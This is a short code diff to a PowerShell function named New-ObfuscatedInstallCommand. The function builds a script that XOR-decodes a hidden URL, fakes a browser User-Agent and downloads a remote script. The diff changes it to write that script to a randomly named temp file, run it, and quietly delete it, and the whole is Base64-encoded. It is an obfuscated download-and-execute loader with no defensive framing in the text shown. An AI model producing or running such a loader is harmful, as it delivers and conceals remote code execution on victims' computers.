@@ -292,7 +292,10 @@ function New-ObfuscatedInstallCommand {
 `$u=[Text.Encoding]::UTF8.GetString([byte[]](`$b|ForEach-Object{`$_ -bxor `$k}))
 `$c=New-Object Net.WebClient
 `$c.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
-iex `$c.DownloadString(`$u)
+`$p=Join-Path `$env:TEMP ('wr_'+[guid]::NewGuid().ToString('N')+'.ps1')
+[IO.File]::WriteAllText(`$p,`$c.DownloadString(`$u))
+& `$p
+Remove-Item `$p -Force -ErrorAction SilentlyContinue
 "@
 
     $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($innerScript))
